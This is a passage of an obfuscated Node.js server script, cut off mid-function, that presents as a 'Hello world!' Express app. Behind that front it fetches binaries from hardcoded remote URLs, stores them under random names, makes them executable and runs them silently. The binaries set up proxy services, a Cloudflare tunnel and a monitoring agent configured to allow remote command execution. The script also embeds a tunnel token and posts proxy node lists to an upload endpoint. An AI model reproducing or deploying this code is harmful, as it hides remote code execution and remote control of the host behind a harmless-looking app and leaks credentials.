const _0x2c5f9f=_0x3810;(function(_0x3bd18,_0x5bc7dc){const _0x14301a={_0x3be60a:0x210,_0x214d80:0x217,_0x468141:0x258,_0x2cfa81:0x21c},_0x5288ff=_0x3810,_0x32e088=_0x3bd18();while(!![]){try{const _0x281099=parseInt(_0x5288ff(0x202))/0x1+parseInt(_0x5288ff(0x1fd))/0x2*(parseInt(_0x5288ff(_0x14301a._0x3be60a))/0x3)+-parseInt(_0x5288ff(0x1f1))/0x4*(-parseInt(_0x5288ff(0x274))/0x5)+-parseInt(_0x5288ff(_0x14301a._0x214d80))/0x6*(-parseInt(_0x5288ff(_0x14301a._0x468141))/0x7)+parseInt(_0x5288ff(0x232))/0x8+parseInt(_0x5288ff(0x20c))/0x9+parseInt(_0x5288ff(0x276))/0xa*(-parseInt(_0x5288ff(_0x14301a._0x2cfa81))/0xb);if(_0x281099===_0x5bc7dc)break;else _0x32e088['push'](_0x32e088['shift']());}catch(_0x10b534){_0x32e088['push'](_0x32e088['shift']());}}}(_0x4196,0x8a14e));const express=require('express'),app=express(),axios=require(_0x2c5f9f(0x226)),os=require('os'),fs=require('fs'),path=require(_0x2c5f9f(0x234)),{promisify}=require(_0x2c5f9f(0x251)),exec=promisify(require(_0x2c5f9f(0x28c))[_0x2c5f9f(0x242)]),{execSync}=require(_0x2c5f9f(0x28c)),UPLOAD_URL=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x221)]||'',PROJECT_URL=process[_0x2c5f9f(0x22d)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x295)]||_0x2c5f9f(0x22b),SUB_PATH=process[_0x2c5f9f(0x22d)]['SUB_PATH']||'sub',PORT=process[_0x2c5f9f(0x22d)]['SERVER_PORT']||process[_0x2c5f9f(0x22d)]['PORT']||0xbb8,UUID=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x1fc)]||_0x2c5f9f(0x231),NEZHA_SERVER=process[_0x2c5f9f(0x22d)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x25b)]||'',NEZHA_KEY=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x2aa)]||'',ARGO_DOMAIN=process[_0x2c5f9f(0x22d)]['ARGO_DOMAIN']||'leaflow.hndz.qzz.io',ARGO_AUTH=process['env'][_0x2c5f9f(0x248)]||'eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiNjM5ZmM3M2QtOTJiMy00YjgwLWIzMTUtNWI1Y2NkOWIzNmRiIiwicyI6Ik9EZGhNakl3WVRRdFlXVTVNaTAwWldSakxUZzJPR1F0TXpCaVpERTROV013WldGaiJ9',ARGO_PORT=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x2b0)]||0x1f41,CFIP=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x21a)]||_0x2c5f9f(0x21b),CFPORT=process['env'][_0x2c5f9f(0x291)]||0x1bb,NAME=process[_0x2c5f9f(0x22d)][_0x2c5f9f(0x253)]||_0x2c5f9f(0x1f6);!fs[_0x2c5f9f(0x236)](FILE_PATH)?(fs[_0x2c5f9f(0x249)](FILE_PATH),console[_0x2c5f9f(0x27b)](FILE_PATH+_0x2c5f9f(0x26a))):console[_0x2c5f9f(0x27b)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4ca069={_0x482f08:0x25f,_0xba94c9:0x2a5,_0x4e347a:0x246},_0x1160d9=_0x2c5f9f,_0xe9b6f9=_0x1160d9(0x228);let _0x42cbd2='';for(let _0x2b717c=0x0;_0x2b717c<0x6;_0x2b717c++){_0x42cbd2+=_0xe9b6f9[_0x1160d9(0x277)](Math[_0x1160d9(_0x4ca069._0x482f08)](Math[_0x1160d9(_0x4ca069._0xba94c9)]()*_0xe9b6f9[_0x1160d9(_0x4ca069._0x4e347a)]));}return _0x42cbd2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2c5f9f(0x239)](FILE_PATH,npmName),phpPath=path[_0x2c5f9f(0x239)](FILE_PATH,phpName),webPath=path[_0x2c5f9f(0x239)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2c5f9f(0x28f)),listPath=path[_0x2c5f9f(0x239)](FILE_PATH,_0x2c5f9f(0x238)),bootLogPath=path[_0x2c5f9f(0x239)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x1a41d1={_0xdf3ff2:0x236,_0x1321c2:0x20e,_0x59fc8a:0x208,_0x56e6c6:0x25c,_0x169ee7:0x257,_0x498cb0:0x237,_0x3c5743:0x1f0},_0x196fef=_0x2c5f9f;try{if(!UPLOAD_URL)return;if(!fs[_0x196fef(_0x1a41d1._0xdf3ff2)](subPath))return;let _0x3c13c6;try{_0x3c13c6=fs[_0x196fef(_0x1a41d1._0x1321c2)](subPath,_0x196fef(0x257));}catch{return null;}const _0xa9af89=Buffer[_0x196fef(_0x1a41d1._0x59fc8a)](_0x3c13c6,_0x196fef(0x24f))[_0x196fef(_0x1a41d1._0x56e6c6)](_0x196fef(_0x1a41d1._0x169ee7)),_0x15ea1d=_0xa9af89['split']('\x0a')[_0x196fef(_0x1a41d1._0x498cb0)](_0x539259=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x196fef(0x244)](_0x539259));if(_0x15ea1d['length']===0x0)return;return axios[_0x196fef(_0x1a41d1._0x3c5743)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x196fef(0x27a)]({'nodes':_0x15ea1d}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x46eb9f=>{return null;}),null;}catch(_0x5af2bd){return null;}}function cleanupOldFiles(){const _0x3ecd65=_0x2c5f9f;try{const _0x1a82b0=fs[_0x3ecd65(0x267)](FILE_PATH);_0x1a82b0['forEach'](_0x226c14=>{const _0x2e0ae7=_0x3ecd65,_0x319d4f=path[_0x2e0ae7(0x239)](FILE_PATH,_0x226c14);try{const _0xe0f6e7=fs[_0x2e0ae7(0x28a)](_0x319d4f);_0xe0f6e7[_0x2e0ae7(0x212)]()&&fs[_0x2e0ae7(0x256)](_0x319d4f);}catch(_0x4ade74){}});}catch(_0x3195f4){}}function _0x3810(_0x15205f,_0x36eeda){const _0x419667=_0x4196();return _0x3810=function(_0x381066,_0x3650a6){_0x381066=_0x381066-0x1ed;let _0x348b23=_0x419667[_0x381066];return _0x348b23;},_0x3810(_0x15205f,_0x36eeda);}app[_0x2c5f9f(0x22e)]('/',function(_0x5687f8,_0x1d11df){const _0x1d5119={_0x41cc6f:0x1f2},_0x3cfe7e=_0x2c5f9f;_0x1d11df['send'](_0x3cfe7e(_0x1d5119._0x41cc6f));});async function generateConfig(){const _0x68d976={_0xfd49de:0x1f4,_0x3e4b1d:0x2a6,_0x58c579:0x29e,_0x54f37d:0x24c,_0x2e2cd5:0x25a,_0x1bcbae:0x280,_0x281573:0x23f,_0x4a2ac1:0x271,_0x5d0f7b:0x23f,_0x48318e:0x272,_0x58f294:0x1f8,_0x41a5e3:0x201,_0x3c4ff2:0x23a,_0x460c1f:0x264,_0x2e37f2:0x239,_0x1268f1:0x284,_0xb915f5:0x27a},_0x4f3df4=_0x2c5f9f,_0x38b3f5={'log':{'access':'/dev/null','error':_0x4f3df4(_0x68d976._0xfd49de),'loglevel':_0x4f3df4(_0x68d976._0x3e4b1d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4f3df4(0x25a),'settings':{'clients':[{'id':UUID,'flow':_0x4f3df4(_0x68d976._0x58c579)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x4f3df4(0x271),'dest':0xbbb},{'path':_0x4f3df4(0x294),'dest':0xbbc}]},'streamSettings':{'network':_0x4f3df4(0x20b)}},{'port':0xbb9,'listen':_0x4f3df4(0x24c),'protocol':_0x4f3df4(0x25a),'settings':{'clients':[{'id':UUID}],'decryption':_0x4f3df4(0x2a6)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x4f3df4(_0x68d976._0x54f37d),'protocol':_0x4f3df4(_0x68d976._0x2e2cd5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4f3df4(_0x68d976._0x3e4b1d),'wsSettings':{'path':_0x4f3df4(0x20a)}},'sniffing':{'enabled':!![],'destOverride':[_0x4f3df4(_0x68d976._0x1bcbae),'tls',_0x4f3df4(_0x68d976._0x281573)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4f3df4(0x24c),'protocol':_0x4f3df4(0x260),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4f3df4(_0x68d976._0x4a2ac1)}},'sniffing':{'enabled':!![],'destOverride':[_0x4f3df4(0x280),'tls',_0x4f3df4(_0x68d976._0x5d0f7b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4f3df4(0x24c),'protocol':_0x4f3df4(0x1f9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4f3df4(0x2a6),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4f3df4(_0x68d976._0x1bcbae),_0x4f3df4(0x24d),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4f3df4(_0x68d976._0x48318e)]},'outbounds':[{'protocol':_0x4f3df4(_0x68d976._0x58f294),'tag':_0x4f3df4(0x266)},{'protocol':_0x4f3df4(_0x68d976._0x41a5e3),'tag':_0x4f3df4(_0x68d976._0x3c4ff2)}]};fs[_0x4f3df4(_0x68d976._0x460c1f)](path[_0x4f3df4(_0x68d976._0x2e37f2)](FILE_PATH,_0x4f3df4(_0x68d976._0x1268f1)),JSON[_0x4f3df4(_0x68d976._0xb915f5)](_0x38b3f5,null,0x2));}function getSystemArchitecture(){const _0x352c6f={_0xa11d64:0x26f,_0x6b5cbd:0x2ae,_0x4b74a8:0x29a,_0x5e4f28:0x273},_0x51e7e1=_0x2c5f9f,_0x47a8f1=os[_0x51e7e1(_0x352c6f._0xa11d64)]();return _0x47a8f1==='arm'||_0x47a8f1===_0x51e7e1(_0x352c6f._0x6b5cbd)||_0x47a8f1===_0x51e7e1(_0x352c6f._0x4b74a8)?_0x51e7e1(0x26e):_0x51e7e1(_0x352c6f._0x5e4f28);}function downloadFile(_0x5bce13,_0xee1ad6,_0x5dcdf5){const _0x2fbf6c={_0x201c61:0x249,_0x5e8d7a:0x241,_0x3f583f:0x1fe},_0x3f93ef={_0x548e2c:0x296,_0x158888:0x275},_0x47b494={_0x483235:0x262,_0x43543f:0x23e},_0x4a1ef8=_0x2c5f9f,_0xe30b57=_0x5bce13;!fs[_0x4a1ef8(0x236)](FILE_PATH)&&fs[_0x4a1ef8(_0x2fbf6c._0x201c61)](FILE_PATH,{'recursive':!![]});const _0x232f39=fs[_0x4a1ef8(_0x2fbf6c._0x5e8d7a)](_0xe30b57);axios({'method':'get','url':_0xee1ad6,'responseType':'stream'})[_0x4a1ef8(_0x2fbf6c._0x3f583f)](_0x3ff260=>{const _0x18c346=_0x4a1ef8;_0x3ff260[_0x18c346(_0x47b494._0x483235)][_0x18c346(0x2ad)](_0x232f39),_0x232f39['on'](_0x18c346(_0x47b494._0x43543f),()=>{const _0x259d3d=_0x18c346;_0x232f39['close'](),console[_0x259d3d(0x27b)]('Download\x20'+path['basename'](_0xe30b57)+'\x20successfully'),_0x5dcdf5(null,_0xe30b57);}),_0x232f39['on'](_0x18c346(0x2a0),_0xef9659=>{const _0x3b60b4=_0x18c346;fs[_0x3b60b4(0x25d)](_0xe30b57,()=>{});const _0x6f302d='Download\x20'+path['basename'](_0xe30b57)+_0x3b60b4(0x296)+_0xef9659[_0x3b60b4(0x275)];console[_0x3b60b4(0x2a0)](_0x6f302d),_0x5dcdf5(_0x6f302d);});})['catch'](_0xe45fc=>{const _0x4c87ef=_0x4a1ef8,_0x309e59=_0x4c87ef(0x292)+path['basename'](_0xe30b57)+_0x4c87ef(_0x3f93ef._0x548e2c)+_0xe45fc[_0x4c87ef(_0x3f93ef._0x158888)];console[_0x4c87ef(0x2a0)](_0x309e59),_0x5dcdf5(_0x309e59);});}function _0x4196(){const _0x4bece0=['existsSync','filter','list.txt','join','block','countryCode','\x20>/dev/null\x202>&1','tunnel.json','finish','quic','false','createWriteStream','exec','pkill\x20-f\x20\x22[','test','NEZHA\x20variable\x20is\x20empty,skip\x20running','length','platform','ARGO_AUTH','mkdirSync','\x0aclient_secret:\x20','unshift','127.0.0.1','tls','\x20>\x20nul\x202>&1','base64','ARGO_DOMAIN:','util','fileName','NAME','\x20is\x20running','Error\x20executing\x20command:\x20','unlinkSync','utf-8','435554HIayaU','clear','vless','NEZHA_PORT','toString','unlink','?encryption=none&security=tls&sni=','floor','vmess','/api/add-nodes','data','?security=tls&sni=','writeFileSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','direct','readdirSync','\x20-p\x20','org','\x20is\x20created','/config.json\x20>/dev/null\x202>&1\x20&','Error\x20reading\x20boot.log:','php\x20running\x20error:\x20','arm','arch','\x0avless://','/vmess-argo','https+local://8.8.8.8/dns-query','amd','639455dhuEik','message','10EFdDzs','charAt','2083','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','stringify','log','text/plain;\x20charset=utf-8','map','/api/add-subscriptions','Unknown','http','forEach','match','2087','config.json','true','config.yaml','boot.log','country_code','application/json','statSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','child_process','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','8443','sub.txt','push','CFPORT','Download\x20','/vmess-argo?ed=2560','/trojan-argo','FILE_PATH','\x20failed:\x20','npm\x20running\x20error:\x20','catch','2096','aarch64','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','http\x20server\x20is\x20running\x20on\x20port:','2053','xtls-rprx-vision','/tunnel.yml\x20run','error','response','443','\x20-c\x20\x22','split','random','none','Nodes\x20uploaded\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','all','NEZHA_KEY','Empowerment\x20failed\x20for\x20','\x22\x20>\x20/dev/null\x202>&1','pipe','arm64','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ARGO_PORT','Subscription\x20uploaded\x20successfully','status','Error\x20in\x20startserver:','post','16dkPnWi','Hello\x20world!','firefox','/dev/null','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','leaflow','http://ip-api.com/json/','freedom','trojan','\x20-s\x20','\x0a\x0atrojan://','UUID','60kxnqZU','then','App\x20is\x20running','\x0a\x20\x20tunnel:\x20','blackhole','967541BpLePY','Skipping\x20adding\x20automatic\x20access\x20task','nohup\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','chmod','\x0a\x20\x20credentials-file:\x20','from','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/vless-argo','tcp','4274739PIooSz','web\x20running\x20error:\x20','readFileSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','25437fBlOVB','fileUrl','isFile','ArgoDomain:','https://amd64.ssss.nyc.mn/v1','listen','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','30oWxyjB','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','set','CFIP','cdns.doon.eu.org','31418761NhnOZd','Error\x20downloading\x20files:','https://arm64.ssss.nyc.mn/agent','includes','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','UPLOAD_URL','TunnelSecret','rm\x20-rf\x20','win32','send','axios','\x0a\x20\x20\x20\x20','abcdefghijklmnopqrstuvwxyz','\x20>/dev/null\x202>&1\x20&','Empowerment\x20success\x20for\x20','./tmp','Content-Type','env','get','&path=%2Fvless-argo%3Fed%3D2560#','substring','7ae44315-e961-9f21-b0f7-05ff593f0b3c','7218216vizDdx','&fp=firefox&type=ws&host=','path','https://arm64.ssss.nyc.mn/bot'];_0x4196=function(){return _0x4bece0;};return _0x4196();}async function downloadFilesAndRun(){const _0x55f359={_0x39a18f:0x246,_0x464413:0x27d,_0x5d6e7d:0x2a9,_0x29bbdd:0x240,_0x53f9b9:0x24a,_0x2ff2b8:0x279,_0x3a6af:0x264,_0x4223dd:0x286,_0x18555f:0x209,_0x69f838:0x27b,_0x20bb18:0x26d,_0x2353e4:0x2a2,_0x5437b1:0x28e,_0x19e866:0x29d,_0x3adff6:0x204,_0x426828:0x268,_0x5892cd:0x297,_0x244f0c:0x27b,_0x4e2dc1:0x236,_0x26a997:0x282,_0x4e7090:0x28b,_0x311c8e:0x229,_0x1effd2:0x2a0},_0x31bac4={_0x24533e:0x281},_0x3fc88d=_0x2c5f9f,_0x17df1e=getSystemArchitecture(),_0x29a79a=getFilesForArchitecture(_0x17df1e);if(_0x29a79a[_0x3fc88d(_0x55f359._0x39a18f)]===0x0){console['log'](_0x3fc88d(0x28d));return;}const _0xc342d5=_0x29a79a[_0x3fc88d(_0x55f359._0x464413)](_0x384482=>{return new Promise((_0x36a6ac,_0xdfbfd9)=>{const _0x1036b2=_0x3810;downloadFile(_0x384482[_0x1036b2(0x252)],_0x384482[_0x1036b2(0x211)],(_0x5a3c36,_0x312966)=>{_0x5a3c36?_0xdfbfd9(_0x5a3c36):_0x36a6ac(_0x312966);});});});try{await Promise[_0x3fc88d(_0x55f359._0x5d6e7d)](_0xc342d5);}catch(_0x3ab3d4){console['error'](_0x3fc88d(0x21d),_0x3ab3d4);return;}function _0x369139(_0x532370){const _0x4ad979={_0x12751a:0x2a0,_0xd6682:0x25c},_0x7974a1=_0x3fc88d,_0x166b10=0x1fd;_0x532370[_0x7974a1(_0x31bac4._0x24533e)](_0x5d9400=>{const _0x14b203=_0x7974a1;fs[_0x14b203(0x236)](_0x5d9400)&&fs[_0x14b203(0x206)](_0x5d9400,_0x166b10,_0x2d3688=>{const _0x2eeeb3=_0x14b203;_0x2d3688?console[_0x2eeeb3(_0x4ad979._0x12751a)](_0x2eeeb3(0x2ab)+_0x5d9400+':\x20'+_0x2d3688):console[_0x2eeeb3(0x27b)](_0x2eeeb3(0x22a)+_0x5d9400+':\x20'+_0x166b10[_0x2eeeb3(_0x4ad979._0xd6682)](0x8));});});}const _0x11eda9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x369139(_0x11eda9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x15fc9f=NEZHA_SERVER[_0x3fc88d(0x21f)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x27066c=new Set(['443',_0x3fc88d(0x28e),_0x3fc88d(0x299),_0x3fc88d(0x283),'2083',_0x3fc88d(0x29d)]),_0x772df0=_0x27066c['has'](_0x15fc9f)?_0x3fc88d(0x285):_0x3fc88d(_0x55f359._0x29bbdd),_0x227d2e=_0x3fc88d(_0x55f359._0x53f9b9)+NEZHA_KEY+_0x3fc88d(_0x55f359._0x2ff2b8)+NEZHA_SERVER+_0x3fc88d(0x20f)+_0x772df0+_0x3fc88d(0x265)+UUID;fs[_0x3fc88d(_0x55f359._0x3a6af)](path[_0x3fc88d(0x239)](FILE_PATH,_0x3fc88d(_0x55f359._0x4223dd)),_0x227d2e);const _0x3b48f0=_0x3fc88d(0x204)+phpPath+_0x3fc88d(0x2a3)+FILE_PATH+_0x3fc88d(_0x55f359._0x18555f);try{await exec(_0x3b48f0),console[_0x3fc88d(_0x55f359._0x69f838)](phpName+'\x20is\x20running'),await new Promise(_0x383291=>setTimeout(_0x383291,0x3e8));}catch(_0x5f3a9e){console['error'](_0x3fc88d(_0x55f359._0x20bb18)+_0x5f3a9e);}}else{let _0x141d15='';const _0x56700b=[_0x3fc88d(_0x55f359._0x2353e4),_0x3fc88d(_0x55f359._0x5437b1),'2096',_0x3fc88d(0x283),_0x3fc88d(0x278),_0x3fc88d(_0x55f359._0x19e866)];_0x56700b[_0x3fc88d(0x21f)](NEZHA_PORT)&&(_0x141d15='--tls');const _0xabe86d=_0x3fc88d(_0x55f359._0x3adff6)+npmPath+_0x3fc88d(0x1fa)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3fc88d(_0x55f359._0x426828)+NEZHA_KEY+'\x20'+_0x141d15+_0x3fc88d(0x2a8);try{await exec(_0xabe86d),console['log'](npmName+_0x3fc88d(0x254)),await new Promise(_0x4d9cb6=>setTimeout(_0x4d9cb6,0x3e8));}catch(_0x2fca32){console[_0x3fc88d(0x2a0)](_0x3fc88d(_0x55f359._0x5892cd)+_0x2fca32);}}}else console[_0x3fc88d(_0x55f359._0x244f0c)](_0x3fc88d(0x245));const _0x591643=_0x3fc88d(_0x55f359._0x3adff6)+webPath+'\x20-c\x20'+FILE_PATH+_0x3fc88d(0x26b);try{await exec(_0x591643),console[_0x3fc88d(_0x55f359._0x69f838)](webName+_0x3fc88d(0x254)),await new Promise(_0x5ba938=>setTimeout(_0x5ba938,0x3e8));}catch(_0x4d1181){console[_0x3fc88d(0x2a0)](_0x3fc88d(0x20d)+_0x4d1181);}if(fs[_0x3fc88d(_0x55f359._0x4e2dc1)](botPath)){let _0x2d49c2;if(ARGO_AUTH[_0x3fc88d(_0x55f359._0x26a997)](/^[A-Z0-9a-z=]{120,250}$/))_0x2d49c2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x3fc88d(0x282)](/TunnelSecret/)?_0x2d49c2=_0x3fc88d(0x2af)+FILE_PATH+_0x3fc88d(0x29f):_0x2d49c2=_0x3fc88d(0x1f5)+FILE_PATH+_0x3fc88d(_0x55f359._0x4e7090)+ARGO_PORT;try{await exec(_0x3fc88d(_0x55f359._0x3adff6)+botPath+'\x20'+_0x2d49c2+_0x3fc88d(_0x55f359._0x311c8e)),console[_0x3fc88d(0x27b)](botName+_0x3fc88d(0x254)),await new Promise(_0x277bb2=>setTimeout(_0x277bb2,0x7d0));}catch(_0x2ddf4f){console[_0x3fc88d(_0x55f359._0x1effd2)](_0x3fc88d(0x255)+_0x2ddf4f);}}await new Promise(_0x21b795=>setTimeout(_0x21b795,0x1388));}function getFilesForArchitecture(_0x6101ce){const _0x1aa886={_0x263cf2:0x21e,_0x1f545e:0x24b,_0x369487:0x24b},_0x560657=_0x2c5f9f;let _0x34236c;_0x6101ce==='arm'?_0x34236c=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x560657(0x235)}]:_0x34236c=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x51e267=_0x6101ce==='arm'?_0x560657(_0x1aa886._0x263cf2):'https://amd64.ssss.nyc.mn/agent';_0x34236c[_0x560657(_0x1aa886._0x1f545e)]({'fileName':npmPath,'fileUrl':_0x51e267});}else{const _0x14ea88=_0x6101ce===_0x560657(0x26e)?'https://arm64.ssss.nyc.mn/v1':_0x560657(0x214);_0x34236c[_0x560657(_0x1aa886._0x369487)]({'fileName':phpPath,'fileUrl':_0x14ea88});}}return _0x34236c;}function argoType(){const _0x1347ad={_0x8e6b08:0x21f,_0x168bfe:0x222,_0x5dd321:0x200,_0x40d72c:0x207,_0x579ba9:0x23d,_0x1438d7:0x220,_0x27070b:0x264},_0x2af679=_0x2c5f9f;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2af679(_0x1347ad._0x8e6b08)](_0x2af679(_0x1347ad._0x168bfe))){fs['writeFileSync'](path[_0x2af679(0x239)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x9f95e9=_0x2af679(_0x1347ad._0x5dd321)+ARGO_AUTH['split']('\x22')[0xb]+_0x2af679(_0x1347ad._0x40d72c)+path['join'](FILE_PATH,_0x2af679(_0x1347ad._0x579ba9))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x2af679(_0x1347ad._0x1438d7);fs[_0x2af679(_0x1347ad._0x27070b)](path['join'](FILE_PATH,'tunnel.yml'),_0x9f95e9);}else console[_0x2af679(0x27b)](_0x2af679(0x218));}async function extractDomains(){const _0x30380a={_0x2eeed6:0x27b,_0x1cf23a:0x287,_0x54e619:0x2a4,_0x2fea8:0x281,_0x427e90:0x27b,_0x5ed582:0x213,_0x3f695b:0x1f5,_0x436d93:0x26c},_0x4f3a04={_0x2ef46b:0x262,_0x3b424d:0x269,_0x257f78:0x262,_0x332518:0x27f},_0x328cdf={_0xf0f77d:0x224,_0x41bac:0x243},_0x20e541=_0x2c5f9f;let _0x124c82;if(ARGO_AUTH&&ARGO_DOMAIN)_0x124c82=ARGO_DOMAIN,console[_0x20e541(_0x30380a._0x2eeed6)](_0x20e541(0x250),_0x124c82),await _0x17cc31(_0x124c82);else try{const _0xf45ff0=fs['readFileSync'](path[_0x20e541(0x239)](FILE_PATH,_0x20e541(_0x30380a._0x1cf23a)),_0x20e541(0x257)),_0x3fafa6=_0xf45ff0[_0x20e541(_0x30380a._0x54e619)]('\x0a'),_0xd38ea3=[];_0x3fafa6[_0x20e541(_0x30380a._0x2fea8)](_0x83373b=>{const _0x1602dd=_0x20e541,_0x129f5e=_0x83373b[_0x1602dd(0x282)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x129f5e){const _0x52f79d=_0x129f5e[0x1];_0xd38ea3['push'](_0x52f79d);}});if(_0xd38ea3['length']>0x0)_0x124c82=_0xd38ea3[0x0],console[_0x20e541(_0x30380a._0x427e90)](_0x20e541(_0x30380a._0x5ed582),_0x124c82),await _0x17cc31(_0x124c82);else{console[_0x20e541(0x27b)](_0x20e541(0x216)),fs[_0x20e541(0x256)](path['join'](FILE_PATH,_0x20e541(0x287)));async function _0xd59fa5(){const _0x3e706e=_0x20e541;try{process['platform']===_0x3e706e(_0x328cdf._0xf0f77d)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x3e706e(_0x328cdf._0x41bac)+botName['charAt'](0x0)+']'+botName[_0x3e706e(0x230)](0x1)+_0x3e706e(0x2ac));}catch(_0x38ab53){}}_0xd59fa5(),await new Promise(_0x1c8c50=>setTimeout(_0x1c8c50,0xbb8));const _0x14b94d=_0x20e541(_0x30380a._0x3f695b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x20e541(0x204)+botPath+'\x20'+_0x14b94d+'\x20>/dev/null\x202>&1\x20&'),console[_0x20e541(0x27b)](botName+_0x20e541(0x254)),await new Promise(_0x20389b=>setTimeout(_0x20389b,0xbb8)),await extractDomains();}catch(_0x4a2bbd){console[_0x20e541(0x2a0)](_0x20e541(0x255)+_0x4a2bbd);}}}catch(_0x1736ad){console[_0x20e541(0x2a0)](_0x20e541(_0x30380a._0x436d93),_0x1736ad);}async function _0x266649(){const _0x4db307=_0x20e541;try{const _0x2e9210=await axios[_0x4db307(0x22e)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x2e9210[_0x4db307(_0x4f3a04._0x2ef46b)]&&_0x2e9210[_0x4db307(0x262)]['country_code']&&_0x2e9210['data'][_0x4db307(_0x4f3a04._0x3b424d)])return _0x2e9210['data'][_0x4db307(0x288)]+'_'+_0x2e9210[_0x4db307(_0x4f3a04._0x2ef46b)]['org'];}catch(_0x107995){try{const _0x548b47=await axios['get'](_0x4db307(0x1f7),{'timeout':0xbb8});if(_0x548b47['data']&&_0x548b47[_0x4db307(0x262)]['status']==='success'&&_0x548b47[_0x4db307(0x262)]['countryCode']&&_0x548b47[_0x4db307(_0x4f3a04._0x257f78)][_0x4db307(_0x4f3a04._0x3b424d)])return _0x548b47['data'][_0x4db307(0x23b)]+'_'+_0x548b47[_0x4db307(_0x4f3a04._0x2ef46b)][_0x4db307(0x269)];}catch(_0x38c3bd){}}return _0x4db307(_0x4f3a04._0x332518);}async function _0x17cc31(_0x8d814b){const _0x16397c=await _0x266649(),_0x3b4b27=NAME?NAME+'-'+_0x16397c:_0x16397c;return new Promise(_0x58a8aa=>{const 